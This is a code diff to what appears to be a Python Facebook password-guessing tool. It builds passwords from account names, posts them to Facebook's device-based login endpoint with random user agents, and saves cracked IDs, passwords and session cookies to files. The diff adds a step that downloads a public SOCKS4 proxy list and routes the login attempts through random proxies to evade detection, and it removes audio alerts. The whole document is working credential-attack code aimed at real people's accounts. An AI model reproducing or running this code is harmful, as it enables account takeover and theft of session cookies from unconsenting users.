@@ -42,6 +42,9 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
+try:
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('.proxy.txt','w').write(prox)        
 logo = ("""\033[1;32m      
   ____  _       ____       _           _ 
  |  _ \| |__   |  _ \ __ _| |__  _   _| |
@@ -296,10 +299,12 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
+                        nip=random.choice(prox)
+                        proxs= {'http': 'socks4://'+nip}
                         head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A(Brand";v="24", "Chromium";v="110", "Google Chrome";v="110"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,proxies=proxs)
                         Rahul=session.cookies.get_dict().keys()
                         if "c_user" in Rahul:
                                 coki=session.cookies.get_dict()
@@ -307,14 +312,12 @@ def ffb(ids,names,passlist):
                                 print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
                                 open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 open('/sdcard/RB-COOKIES.txt', 'a').write(ids+'|'+kuki+'\n')
-                                os.open('play-audio data/ok.mp3')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Rahul:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                        os.open('play-audio data/cp.mp3')
                                         cps.append(ids)
                                         break
                                         
